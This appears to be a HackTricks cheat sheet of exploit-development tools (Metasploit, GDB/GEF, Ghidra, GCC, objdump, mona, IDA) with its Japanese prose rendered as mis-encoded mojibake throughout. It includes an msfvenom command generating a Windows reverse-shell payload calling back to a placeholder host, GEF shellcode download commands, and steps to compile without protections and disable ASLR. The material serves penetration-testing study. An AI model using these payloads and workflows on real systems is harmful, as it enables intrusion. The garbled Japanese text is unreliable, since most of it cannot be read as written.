<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>


# Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
## ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰

A shellcode is a small piece of code that is used as the payload in an exploit. It is typically written in assembly language and is designed to be injected into a vulnerable program to gain unauthorized access or execute arbitrary commands.

ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¯ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã‚‹å°ã•ãªã‚³ãƒ¼ãƒ‰ã§ã™ã€‚é€šå¸¸ã€ã‚¢ã‚»ãƒ³ãƒ–ãƒªè¨€èªã§æ›¸ã‹ã‚Œã€è„†å¼±ãªãƒ—ãƒ­ã‚°ãƒ©ãƒ ã«æ³¨å…¥ã•ã‚Œã€ä¸æ­£ãªã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ã—ãŸã‚Šã€ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã‚Šã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™ã€‚

Shellcodes are commonly used in buffer overflow attacks, where an attacker overflows a buffer in a program to overwrite the return address and redirect the program's execution flow to the injected shellcode.

ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¯ã€ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼æ”»æ’ƒã§ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ å†…ã®ãƒãƒƒãƒ•ã‚¡ã‚’ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã•ã›ã€ãƒªã‚¿ãƒ¼ãƒ³ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä¸Šæ›¸ãã—ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®å®Ÿè¡Œãƒ•ãƒ­ãƒ¼ã‚’æ³¨å…¥ã•ã‚ŒãŸã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã—ã¾ã™ã€‚

Shellcodes can be written in different architectures, such as x86, x64, ARM, MIPS, etc., depending on the target system's architecture.

ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¯ã€å¯¾è±¡ã‚·ã‚¹ãƒ†ãƒ ã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã«å¿œã˜ã¦ã€x86ã€x64ã€ARMã€MIPSãªã©ã€ã•ã¾ã–ã¾ãªã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã§æ›¸ã‹ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

There are various techniques to create shellcodes, including manual assembly, using shellcode generators, or leveraging existing shellcode libraries.

ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹ãŸã‚ã®ã•ã¾ã–ã¾ãªãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒã‚ã‚Šã¾ã™ã€‚æ‰‹å‹•ã‚¢ã‚»ãƒ³ãƒ–ãƒªã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ã®ä½¿ç”¨ã€ã¾ãŸã¯æ—¢å­˜ã®ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®æ´»ç”¨ãªã©ãŒã‚ã‚Šã¾ã™ã€‚

It is important to note that the use of shellcodes for unauthorized access or malicious purposes is illegal and unethical. Shellcodes should only be used for legitimate purposes, such as penetration testing or security research.

ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ä¸æ­£ãªã‚¢ã‚¯ã‚»ã‚¹ã‚„æ‚ªæ„ã®ã‚ã‚‹ç›®çš„ã§ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯ã€é•æ³•ã§å€«ç†ã«åã—ã¾ã™ã€‚ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¯ã€ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç ”ç©¶ãªã©ã®æ­£å½“ãªç›®çš„ã«ã®ã¿ä½¿ç”¨ã™ã‚‹ã¹ãã§ã™ã€‚
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
# GDB

## ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«

GDBï¼ˆGNU Debuggerï¼‰ã¯ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ‡ãƒãƒƒã‚°ã«ä½¿ç”¨ã•ã‚Œã‚‹å¼·åŠ›ãªãƒ„ãƒ¼ãƒ«ã§ã™ã€‚GDBã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹ã«ã¯ã€æ¬¡ã®æ‰‹é †ã«å¾“ã£ã¦ãã ã•ã„ã€‚

### Linux

1. ã‚¿ãƒ¼ãƒŸãƒŠãƒ«ã‚’é–‹ãã¾ã™ã€‚
2. æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã€GDBã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚

   ```
   sudo apt-get install gdb
   ```

### macOS

1. ã‚¿ãƒ¼ãƒŸãƒŠãƒ«ã‚’é–‹ãã¾ã™ã€‚
2. Homebrewã‚’ä½¿ç”¨ã—ã¦GDBã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

   ```
   brew install gdb
   ```

### Windows

Windowsã§ã¯ã€GDBã‚’ç›´æ¥ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ä»£ã‚ã‚Šã«ã€Cygwinã‚„MinGWã‚’ä½¿ç”¨ã—ã¦GDBã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®æ‰‹é †ã‚’å‚è€ƒã«ã—ã¦ãã ã•ã„ã€‚

1. Cygwinã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚[å…¬å¼ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆ](https://www.cygwin.com/)ã‹ã‚‰ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ©ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚
2. ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ä¸­ã«ã€ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãƒãƒãƒ¼ã‚¸ãƒ£ã‚’ä½¿ç”¨ã—ã¦`gdb`ã‚’é¸æŠã—ã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚
3. MinGWã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚[å…¬å¼ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆ](http://www.mingw.org/)ã‹ã‚‰ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ©ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚
4. ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ä¸­ã«ã€ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãƒãƒãƒ¼ã‚¸ãƒ£ã‚’ä½¿ç”¨ã—ã¦`gdb`ã‚’é¸æŠã—ã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚

GDBã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ãŒå®Œäº†ã—ãŸã‚‰ã€æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§GDBã®åŸºæœ¬çš„ãªä½¿ç”¨æ–¹æ³•ã«ã¤ã„ã¦å­¦ã³ã¾ã—ã‚‡ã†ã€‚
```
apt-get install gdb
```
## ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿

**-q** --> ãƒãƒŠãƒ¼ã‚’è¡¨ç¤ºã—ãªã„\
**-x \<file>** --> ã“ã“ã‹ã‚‰GDBã®å‘½ä»¤ã‚’è‡ªå‹•å®Ÿè¡Œã™ã‚‹\
**-p \<pid>** --> ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚¢ã‚¿ãƒƒãƒã™ã‚‹

### å‘½ä»¤

\> **disassemble main** --> é–¢æ•°ã‚’é€†ã‚¢ã‚»ãƒ³ãƒ–ãƒ«ã™ã‚‹\
\> **disassemble 0x12345678**\
\> **set disassembly-flavor intel**\
\> **set follow-fork-mode child/parent** --> ä½œæˆã•ã‚ŒãŸãƒ—ãƒ­ã‚»ã‚¹ã‚’è¿½è·¡ã™ã‚‹\
\> **p system** --> systemé–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹\
\> **help**\
\> **quit**

\> **br func**  --> é–¢æ•°ã«ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’è¿½åŠ ã™ã‚‹\
\> **br \*func+23**\
\> **br \*0x12345678**\
**> del NUM** --> ãã®æ•°ã®ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’å‰Šé™¤ã™ã‚‹\
\> **watch EXPRESSION** --> å€¤ãŒå¤‰æ›´ã•ã‚ŒãŸå ´åˆã«ä¸­æ–­ã™ã‚‹

**> run** --> å®Ÿè¡Œã™ã‚‹\
**> start** --> mainã§é–‹å§‹ã—ã¦ä¸­æ–­ã™ã‚‹\
\> **n/next** --> æ¬¡ã®å‘½ä»¤ã‚’å®Ÿè¡Œã™ã‚‹ï¼ˆå†…éƒ¨ã«ã¯å…¥ã‚‰ãªã„ï¼‰\
\> **s/step** --> æ¬¡ã®å‘½ä»¤ã‚’å®Ÿè¡Œã™ã‚‹\
\> **c/continue** --> æ¬¡ã®ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã¾ã§ç¶šè¡Œã™ã‚‹

\> **set $eip = 0x12345678** --> $eipã®å€¤ã‚’å¤‰æ›´ã™ã‚‹\
\> **info functions** --> é–¢æ•°ã«é–¢ã™ã‚‹æƒ…å ±\
\> **info functions func** --> é–¢æ•°ã®æƒ…å ±\
\> **info registers** --> ãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤\
\> **bt** --> ã‚¹ã‚¿ãƒƒã‚¯\
\> **bt full** --> è©³ç´°ãªã‚¹ã‚¿ãƒƒã‚¯

\> **print variable**\
\> **print 0x87654321 - 0x12345678** --> è¨ˆç®—ã™ã‚‹\
\> **examine o/x/u/t/i/s dir\_mem/reg/puntero** --> 8é€²æ•°/16é€²æ•°/10é€²æ•°/2é€²æ•°/å‘½ä»¤/ASCIIã§å†…å®¹ã‚’è¡¨ç¤ºã™ã‚‹

* **x/o 0xDir\_hex**
* **x/2x $eip** --> EIPã‹ã‚‰2ãƒ¯ãƒ¼ãƒ‰
* **x/2x $eip -4** -->  $eip - 4
* **x/8xb $eip** --> 8ãƒã‚¤ãƒˆï¼ˆb-> ãƒã‚¤ãƒˆ, h-> 2ãƒã‚¤ãƒˆ, w-> 4ãƒã‚¤ãƒˆ, g-> 8ãƒã‚¤ãƒˆï¼‰
* **i r eip** --> $eipã®å€¤
* **x/w pointer** --> ãƒã‚¤ãƒ³ã‚¿ã®å€¤
* **x/s pointer** --> ãƒã‚¤ãƒ³ã‚¿ãŒæŒ‡ã™æ–‡å­—åˆ—
* **x/xw \&pointer** --> ãƒã‚¤ãƒ³ã‚¿ã®å ´æ‰€ã®ã‚¢ãƒ‰ãƒ¬ã‚¹
* **x/i $eip** â€”> EIPã®å‘½ä»¤

## [GEF](https://github.com/hugsy/gef)
```bash
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- efâ¤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gefâ¤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
## ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯

### GDBã®åŒã˜ã‚¢ãƒ‰ãƒ¬ã‚¹

ãƒ‡ãƒãƒƒã‚°ä¸­ã«ã¯ã€GDBã¯**å®Ÿè¡Œæ™‚ã«ãƒã‚¤ãƒŠãƒªãŒä½¿ç”¨ã™ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ã¯è‹¥å¹²ç•°ãªã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒã¤ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚** GDBãŒåŒã˜ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒã¤ã‚ˆã†ã«ã™ã‚‹ã«ã¯ã€æ¬¡ã®æ‰‹é †ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<path>` _ãƒã‚¤ãƒŠãƒªã®çµ¶å¯¾ãƒ‘ã‚¹ã‚’æŒ‡å®šã—ã¾ã™_
* åŒã˜çµ¶å¯¾ãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒŠãƒªã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã—ã¾ã™
* GDBã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã¨ãã¨ãƒã‚¤ãƒŠãƒªã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã—ã¦ã„ã‚‹ã¨ãã«ã€`PWD`ã¨`OLDPWD`ã¯åŒã˜ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™

### é–¢æ•°ã®å‘¼ã³å‡ºã—ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã®ãƒãƒƒã‚¯ãƒˆãƒ¬ãƒ¼ã‚¹

**é™çš„ã«ãƒªãƒ³ã‚¯ã•ã‚ŒãŸãƒã‚¤ãƒŠãƒª**ã®å ´åˆã€ã™ã¹ã¦ã®é–¢æ•°ã¯ãƒã‚¤ãƒŠãƒªã«å±ã—ã¦ã„ã¾ã™ï¼ˆå¤–éƒ¨ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰ã€‚ã“ã®å ´åˆã€ãƒã‚¤ãƒŠãƒªãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®å…¥åŠ›ã‚’è¦æ±‚ã™ã‚‹ãŸã‚ã«ãŸã©ã‚‹ãƒ•ãƒ­ãƒ¼ã‚’**ç‰¹å®šã™ã‚‹ã®ã¯å›°é›£**ã§ã™ã€‚\
ãƒã‚¤ãƒŠãƒªã‚’**gdb**ã§å®Ÿè¡Œã—ã€å…¥åŠ›ã‚’è¦æ±‚ã•ã‚Œã‚‹ã¾ã§å®Ÿè¡Œã—ã¾ã™ã€‚ãã®å¾Œã€**CTRL+C**ã§åœæ­¢ã—ã€**`bt`**ï¼ˆ**ãƒãƒƒã‚¯ãƒˆãƒ¬ãƒ¼ã‚¹**ï¼‰ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦å‘¼ã³å‡ºã•ã‚ŒãŸé–¢æ•°ã‚’ç¢ºèªã§ãã¾ã™ã€‚
```
gefâ¤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
## GDBã‚µãƒ¼ãƒãƒ¼

`gdbserver --multi 0.0.0.0:23947`ï¼ˆIDAã§ã¯ã€Linuxãƒã‚·ãƒ³ã¨Windowsãƒã‚·ãƒ³ã®å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã®çµ¶å¯¾ãƒ‘ã‚¹ã‚’å…¥åŠ›ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰

# Ghidra

## ã‚¹ã‚¿ãƒƒã‚¯ã‚ªãƒ•ã‚»ãƒƒãƒˆã®æ¤œç´¢

**Ghidra**ã¯ã€**ãƒ­ãƒ¼ã‚«ãƒ«å¤‰æ•°ã®ä½ç½®ã«é–¢ã™ã‚‹æƒ…å ±ã«ã‚ˆã£ã¦ã€ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã®ã«éå¸¸ã«ä¾¿åˆ©ã§ã™ã€‚**\
ãŸã¨ãˆã°ã€ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€`local_bc`ã§ã®ãƒãƒƒãƒ•ã‚¡ãƒ•ãƒ­ãƒ¼ã¯ã€ã‚ªãƒ•ã‚»ãƒƒãƒˆ`0xbc`ãŒå¿…è¦ã§ã‚ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã•ã‚‰ã«ã€`local_10`ãŒã‚­ãƒ£ãƒŠãƒªãƒ¼ã‚³ãƒ³ã‚­ãƒ¼ã§ã‚ã‚‹å ´åˆã€`local_bc`ã‹ã‚‰ãã‚Œã‚’ä¸Šæ›¸ãã™ã‚‹ãŸã‚ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã¯`0xac`ã§ã™ã€‚\
_ RIPãŒä¿å­˜ã•ã‚Œã‚‹æœ€åˆã®0x08ã¯ã€RBPã«å±ã—ã¦ã„ã‚‹ã“ã¨ã‚’è¦šãˆã¦ãŠã„ã¦ãã ã•ã„ã€‚_

![](<../../.gitbook/assets/image (616).png>)

# GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> ä¿è­·ãªã—ã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹\
**-o** --> å‡ºåŠ›\
**-g** --> ã‚³ãƒ¼ãƒ‰ã‚’ä¿å­˜ã™ã‚‹ï¼ˆGDBã§è¡¨ç¤ºã§ãã‚‹ã‚ˆã†ã«ãªã‚‹ï¼‰\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> Linuxã§ASLRã‚’ç„¡åŠ¹ã«ã™ã‚‹ãŸã‚

**ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹ã«ã¯:**\
**nasm -f elf assembly.asm** --> ".o"ã‚’è¿”ã™\
**ld assembly.o -o shellcodeout** --> å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«

# Objdump

**-d** --> å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’é€†ã‚¢ã‚»ãƒ³ãƒ–ãƒ«ã™ã‚‹ï¼ˆã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã‚ªãƒšã‚³ãƒ¼ãƒ‰ã‚’è¡¨ç¤ºã—ã€ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã€é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹...ï¼‰\
**-Mintel** --> **Intel**æ§‹æ–‡\
**-t** --> **ã‚·ãƒ³ãƒœãƒ«**ãƒ†ãƒ¼ãƒ–ãƒ«\
**-D** --> **ã™ã¹ã¦ã®**é€†ã‚¢ã‚»ãƒ³ãƒ–ãƒ«ï¼ˆé™çš„å¤‰æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼‰\
**-s -j .dtors** --> dtorsã‚»ã‚¯ã‚·ãƒ§ãƒ³\
**-s -j .got** --> gotã‚»ã‚¯ã‚·ãƒ§ãƒ³\
\-D -s -j .plt --> **plt**ã‚»ã‚¯ã‚·ãƒ§ãƒ³ **é€†ã‚¢ã‚»ãƒ³ãƒ–ãƒ«**\
**-TR** --> **ãƒªãƒ­ã‚±ãƒ¼ã‚·ãƒ§ãƒ³**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> GOTå†…ã®"puts"ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¤‰æ›´ã™ã‚‹ãŸã‚ã®ã‚¢ãƒ‰ãƒ¬ã‚¹\
**objdump -D ./exec | grep "VAR\_NAME"** --> é™çš„å¤‰æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆã“ã‚Œã‚‰ã¯DATAã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«æ ¼ç´ã•ã‚Œã¦ã„ã¾ã™ï¼‰ã€‚

# ã‚³ã‚¢ãƒ€ãƒ³ãƒ—

1. ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’é–‹å§‹ã™ã‚‹å‰ã« `ulimit -c unlimited` ã‚’å®Ÿè¡Œã—ã¾ã™
2. `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t` ã‚’å®Ÿè¡Œã—ã¾ã™
3. `sudo gdb --core=\<path/core> --quiet` ã‚’å®Ÿè¡Œã—ã¾ã™

# ãã®ä»–

**ldd executable | grep libc.so.6** --> ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆASLRãŒæœ‰åŠ¹ãªå ´åˆã€ã“ã‚Œã¯æ¯å›å¤‰ã‚ã‚Šã¾ã™ï¼‰\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå¤§å¹…ã«å¤‰åŒ–ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã®ãƒ«ãƒ¼ãƒ—\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> "system"ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆ\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> "/bin/sh"ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆ

**strace executable** --> å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ãŒå‘¼ã³å‡ºã™é–¢æ•°\
**rabin2 -i ejecutable -->** ã™ã¹ã¦ã®é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹

# **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
# IDA

## ãƒªãƒ¢ãƒ¼ãƒˆLinuxã§ã®ãƒ‡ãƒãƒƒã‚°

IDAãƒ•ã‚©ãƒ«ãƒ€å†…ã«ã¯ã€Linuxå†…ã®ãƒã‚¤ãƒŠãƒªã‚’ãƒ‡ãƒãƒƒã‚°ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ãƒã‚¤ãƒŠãƒªãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ãã®ãŸã‚ã«ã¯ã€ãƒã‚¤ãƒŠãƒª_linux\_server_ã¾ãŸã¯_linux\_server64_ã‚’Linuxã‚µãƒ¼ãƒãƒ¼å†…ã«ç§»å‹•ã—ã€ãƒã‚¤ãƒŠãƒªãŒå«ã¾ã‚Œã¦ã„ã‚‹ãƒ•ã‚©ãƒ«ãƒ€å†…ã§å®Ÿè¡Œã—ã¾ã™ã€‚
```
./linux_server64 -Ppass
```
æ¬¡ã«ã€ãƒ‡ãƒãƒƒã‚¬ã‚’è¨­å®šã—ã¾ã™ï¼šãƒ‡ãƒãƒƒã‚¬ï¼ˆãƒªãƒ¢ãƒ¼ãƒˆLinuxï¼‰â†’ãƒ—ãƒ­ã‚»ã‚¹ã‚ªãƒ—ã‚·ãƒ§ãƒ³...ï¼š

![](<../../.gitbook/assets/image (101).png>)


<details>

